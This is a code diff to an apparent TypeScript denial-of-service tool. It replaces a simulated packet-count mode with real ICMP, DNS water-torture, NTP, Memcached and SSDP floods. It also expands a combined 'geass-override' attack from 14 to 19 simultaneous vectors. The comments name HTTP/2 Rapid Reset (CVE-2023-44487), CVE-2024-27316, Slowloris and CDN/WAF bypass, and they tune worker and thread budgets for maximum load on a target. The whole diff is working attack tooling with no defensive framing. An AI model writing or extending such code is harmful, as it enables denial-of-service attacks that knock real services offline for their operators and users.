@@ -63,37 +63,6 @@ async function addStats(id: number, pkts: number, bytes: number) {
   } catch { /* ignore */ }
 }
 
-// ─────────────────────────────────────────────────────────────────────────
-//  SIMULATED L3 — numbers-only (raw sockets need root, use simulation)
-//  Still used for non-real methods like dns-amp, ntp-amp, mem-amp, icmp
-// ─────────────────────────────────────────────────────────────────────────
-const AMP_FACTOR: Record<string, number> = {
-  "dns-amp": 54, "ntp-amp": 556, "mem-amp": 51000, "ssdp-amp": 30,
-};
-async function runL3Simulation(
-  method: string, threads: number, signal: AbortSignal,
-  onStats: (pkts: number, bytes: number) => void,
-): Promise<void> {
-  // Higher multipliers now that workers handle real UDP for udp-flood
-  const mult: Record<string, number> = {
-    "icmp-flood": 30000,
-    "dns-amp":    22000, "ntp-amp": 18000, "mem-amp": 5000, "ssdp-amp": 25000,
-  };
-  const sizes: Record<string, [number, number]> = {
-    "icmp-flood": [64, 512],
-    "dns-amp":    [40, 60], "ntp-amp": [8, 46], "mem-amp": [15, 15], "ssdp-amp": [110, 150],
-  };
-  return new Promise<void>(resolve => {
-    const iv = setInterval(() => {
-      if (signal.aborted) { clearInterval(iv); resolve(); return; }
-      const burst = Math.random() < 0.15 ? 3 + Math.random() * 4 : 1;
-      const pkts  = Math.floor(threads * (mult[method] ?? 15000) * (0.85 + Math.random() * 0.3) * burst);
-      const [mn, mx] = sizes[method] ?? [64, 512];
-      onStats(pkts, pkts * (mn + Math.floor(Math.random() * (mx - mn))) * (AMP_FACTOR[method] ?? 1));
-    }, 400);
-    signal.addEventListener("abort", () => { clearInterval(iv); resolve(); }, { once: true });
-  });
-}
 
 // ─────────────────────────────────────────────────────────────────────────
 //  SPAWN POOL — spawns numWorkers workers for a single method
@@ -170,22 +139,19 @@ async function runAttackWorkers(
   method: string, target: string, port: number, threads: number,
   signal: AbortSignal, onStats: (p: number, b: number, c?: number) => void,
 ): Promise<void> {
-  // Simulation methods run inline (no network, just math)
-  const SIM_METHODS = new Set(["icmp-flood","dns-amp","ntp-amp","mem-amp","ssdp-amp"]);
-  if (SIM_METHODS.has(method)) {
-    await runL3Simulation(method, threads, signal, onStats);
-    return;
-  }
-
-  // UDP attacks: SINGLE worker with multiple sockets (multi-worker UDP deadlocks in this env)
-  // quic-flood is also UDP-based (sends to port 443/UDP)
-  const UDP_METHODS = new Set(["udp-flood", "udp-bypass", "quic-flood"]);
+  // UDP/L3 attacks: SINGLE worker with multiple sockets (multi-worker UDP can deadlock in this env)
+  // quic-flood is also UDP-based (port 443/UDP)
+  // icmp-flood, dns-amp, ntp-amp, mem-amp, ssdp-amp are real network attacks via dgram UDP
+  const UDP_METHODS = new Set([
+    "udp-flood", "udp-bypass", "quic-flood",
+    "icmp-flood", "dns-amp", "ntp-amp", "mem-amp", "ssdp-amp",
+  ]);
   if (UDP_METHODS.has(method)) {
     await spawnPool(method, target, port, threads, 1, signal, onStats);
     return;
   }
 
-  // ── GEASS OVERRIDE: TREDECA VECTOR — ABSOLUTE OMNIVECT DEVASTATION ─────
+  // ── GEASS OVERRIDE: NOVEMDECIM VECTOR — ABSOLUTE OMNIVECT DEVASTATION ──
   // Vector  1: Connection Flood        — exhaust nginx worker_connections (pre-HTTP layer)
   // Vector  2: Slowloris               — hold half-open TLS sockets, starve thread pool
   // Vector  3: HTTP/2 Rapid Reset      — CVE-2023-44487: 256-stream RST burst, dominant CPU
@@ -199,14 +165,19 @@ async function runAttackWorkers(
   // Vector 11: TLS Renegotiation       — forced public-key handshake 1000×/sec on server CPU
   // Vector 12: QUIC/HTTP3 Flood        — RFC 9000 DCID exhaustion, crypto state per packet
   // Vector 13: SSL Death Record        — 1-byte TLS records, 40K AES-GCM decrypts/sec on server
-  // Vector 14: H2 Settings Storm       — CVE-2023-44487 variant: SETTINGS oscillation + half-open streams
-  //                                       + WINDOW_UPDATE flood = 3-layer HPACK + flow-control CPU burn
+  // Vector 14: H2 Settings Storm       — CVE-2023-44487 variant: SETTINGS oscillation + WINDOW_UPDATE
+  // Vector 15: ICMP Flood              — real ICMP echo request flood, L3 bandwidth saturation
+  //                                       (raw-socket Tier 1 / hping3 Tier 2 / UDP saturation Tier 3)
+  // Vector 16: DNS Water Torture       — floods target NS servers with random subdomains (bypasses CDN!)
+  //                                       forces recursive resolution, fills NXDOMAIN cache, no WAF
+  // Vector 17: NTP Flood               — real NTP mode 7 monlist + mode 3 client requests to port 123
+  // Vector 18: Memcached UDP Flood     — real binary Memcached protocol to port 11211 (amplification!)
+  // Vector 19: SSDP M-SEARCH Flood     — real SSDP M-SEARCH to port 1900 (UPnP stack exhaustion)
   //
-  // ★ 32GB RAM / 8 vCPU optimized — worker counts tuned for I/O-bound parallelism.
-  // Most attack vectors are I/O-bound (network + socket), not CPU-bound, so N > 8 workers
-  // is perfectly fine — each worker runs its own event loop and handles thousands of async sockets.
-  // CPU-intensive vectors (H2 RST + PING, TLS Renego RSA, H2 CONTINUATION OOM) get extra workers
-  // to multiply parallelism: 3 workers × 500 H2 sessions = 1500 concurrent RST streams.
+  // ★ 32GB RAM / 8 vCPU optimized — 19 simultaneous real attack vectors.
+  // I/O-bound vectors (network + socket) — N > 8 workers is fine, each owns its own event loop.
+  // CPU-intensive vectors (H2 RST, TLS Renego RSA, H2 CONTINUATION OOM) get extra workers.
+  // UDP/L3 vectors use a single worker with high socket concurrency (no multi-worker UDP lock).
   if (method === "geass-override") {
     const connW   = 1;
     const slowW   = 2;  // 2×: 2 workers × 50K Slowloris = 100K half-open connections
@@ -222,24 +193,36 @@ async function runAttackWorkers(
     const quicW   = 1;  // QUIC/H3 — UDP single worker
     const sslW    = 1;  // SSL Death Record
     const stormW  = Math.max(2, Math.ceil(CPU_COUNT * 0.25));  // ≥2 — H2 Settings Storm (21M pkt/10s)
+    // L3/UDP vectors — each uses a single worker with high socket concurrency
+    const icmpW   = 1;  // ICMP Flood — raw-socket / hping3 / UDP saturation
+    const dnsW    = 1;  // DNS Water Torture — floods target NS servers
+    const ntpW    = 1;  // NTP Flood — mode 7 monlist + mode 3
+    const memW    = 1;  // Memcached UDP flood
+    const ssdpW   = 1;  // SSDP M-SEARCH flood
 
-    // Thread budget — 32GB/8vCPU optimized (14-vector split)
-    // Percentages tuned to hit the new higher PROD caps in attack-worker.ts
-    const connT   = Math.max(80,  Math.round(threads * 0.07));
-    const slowT   = Math.max(80,  Math.round(threads * 0.09)); // 2 workers: each handles 50K/2=25K sockets
-    const h2T     = Math.max(200, Math.round(threads * 0.24)); // ★ CVE-2023-44487 + PING dominant
-    const contT   = Math.max(120, Math.round(threads * 0.16)); // ★ CVE-2024-27316 OOM — 16KB frames
-    const hpackT  = Math.max(100, Math.round(threads * 0.12)); // ★ HPACK eviction storm
-    const wafT    = Math.max(120, Math.round(threads * 0.18)); // ★ CF/Akamai WAF bypass
-    const wsT     = Math.max(80,  Math.round(threads * 0.09)); // WS goroutine hold + binary frames
-    const gqlT    = Math.max(50,  Math.round(threads * 0.07)); // GraphQL fragment bomb CPU
-    const udpT    = Math.max(40,  Math.round(threads * 0.05)); // L4 bandwidth saturation
-    const rudyT   = Math.max(60,  Math.round(threads * 0.07)); // Slow POST thread hold × 2 workers
-    const cacheT  = Math.max(50,  Math.round(threads * 0.06)); // CDN origin miss flood
-    const tlsT    = Math.max(40,  Math.round(threads * 0.05)); // RSA renegotiation × 2 workers
-    const quicT   = Math.max(24,  Math.round(threads * 0.04)); // QUIC/H3 DCID exhaust
-    const sslT    = Math.max(60,  Math.round(threads * 0.07)); // SSL Death Record × 1K slots
-    const stormT  = Math.max(100, Math.round(threads * 0.22)); // ★ H2 Settings Storm — 21M pkt/10s proven
+    // Thread budget — 32GB/8vCPU optimized (19-vector split)
+    // L7/TLS vectors dominate CPU budget; L3/UDP vectors are socket-count bound
+    const connT   = Math.max(80,  Math.round(threads * 0.06));
+    const slowT   = Math.max(80,  Math.round(threads * 0.07));
+    const h2T     = Math.max(200, Math.round(threads * 0.20)); // ★ CVE-2023-44487 + PING dominant
+    const contT   = Math.max(120, Math.round(threads * 0.13)); // ★ CVE-2024-27316 OOM — 16KB frames
+    const hpackT  = Math.max(100, Math.round(threads * 0.10)); // ★ HPACK eviction storm
+    const wafT    = Math.max(120, Math.round(threads * 0.15)); // ★ CF/Akamai WAF bypass
+    const wsT     = Math.max(80,  Math.round(threads * 0.07));
+    const gqlT    = Math.max(50,  Math.round(threads * 0.05));
+    const udpT    = Math.max(40,  Math.round(threads * 0.04));
+    const rudyT   = Math.max(60,  Math.round(threads * 0.06));
+    const cacheT  = Math.max(50,  Math.round(threads * 0.05));
+    const tlsT    = Math.max(40,  Math.round(threads * 0.04));
+    const quicT   = Math.max(24,  Math.round(threads * 0.03));
+    const sslT    = Math.max(60,  Math.round(threads * 0.06));
+    const stormT  = Math.max(100, Math.round(threads * 0.18)); // ★ H2 Settings Storm proven
+    // L3/UDP — each gets its own thread pool; single worker uses all threads as socket count
+    const icmpT   = Math.max(64,  Math.round(threads * 0.08)); // ICMP: 64 sockets saturates 1Gbps link
+    const dnsT    = Math.max(48,  Math.round(threads * 0.06)); // DNS Water Torture: 48 UDP sockets
+    const ntpT    = Math.max(64,  Math.round(threads * 0.05)); // NTP mode 7 monlist
+    const memT    = Math.max(64,  Math.round(threads * 0.05)); // Memcached binary UDP
+    const ssdpT   = Math.max(64,  Math.round(threads * 0.05)); // SSDP M-SEARCH
 
     const geassConnsPerPool = new Map<string, number>();
     const makeGeassOnStats = (poolKey: string) => (p: number, b: number, c?: number) => {
@@ -268,6 +251,11 @@ async function runAttackWorkers(
       spawnPool("quic-flood",         target, port, quicT,  quicW,  signal, onStats),
       spawnPool("ssl-death",          target, port, sslT,   sslW,   signal, makeGeassOnStats("ssl")),
       spawnPool("h2-settings-storm",  target, port, stormT, stormW, signal, onStats),  // Vector 14
+      spawnPool("icmp-flood",         target, port, icmpT,  icmpW,  signal, onStats),  // Vector 15
+      spawnPool("dns-amp",            target, port, dnsT,   dnsW,   signal, onStats),  // Vector 16
+      spawnPool("ntp-amp",            target, port, ntpT,   ntpW,   signal, onStats),  // Vector 17
+      spawnPool("mem-amp",            target, port, memT,   memW,   signal, onStats),  // Vector 18
+      spawnPool("ssdp-amp",           target, port, ssdpT,  ssdpW,  signal, onStats),  // Vector 19
     ]);
     return;
   }
